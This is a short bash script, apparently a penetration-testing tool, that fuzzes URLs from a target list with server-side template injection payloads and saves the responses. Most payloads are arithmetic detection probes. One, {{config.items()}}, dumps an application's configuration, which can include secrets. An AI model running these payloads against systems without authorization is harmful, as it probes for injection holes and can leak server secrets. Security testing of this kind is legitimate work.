#!/bin/bash
echo "🧾 SSTI Injection Fuzzer - Template Injection Payload Tester"

mkdir -p ssti_results

if [[ ! -f ssti_targets.txt ]]; then
  echo "Missing ssti_targets.txt. Provide endpoints with injectable parameters."
  exit 1
fi

PAYLOADS=(
  "{{7*7}}" 
  "${{7*7}}" 
  "<%= 7 * 7 %>" 
  "#{7*7}" 
  "{{config.items()}}"
)

while read -r base; do
  echo "Target: $base"
  for payload in "${PAYLOADS[@]}"; do
    encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)
    url="${base}${encoded_payload}"
    echo "Testing $url"
    curl -s "$url" -o "ssti_results/$(echo $payload | md5sum | cut -d' ' -f1).txt"
  done
done < ssti_targets.txt

echo "SSTI fuzzing completed. Results saved in ssti_results/"
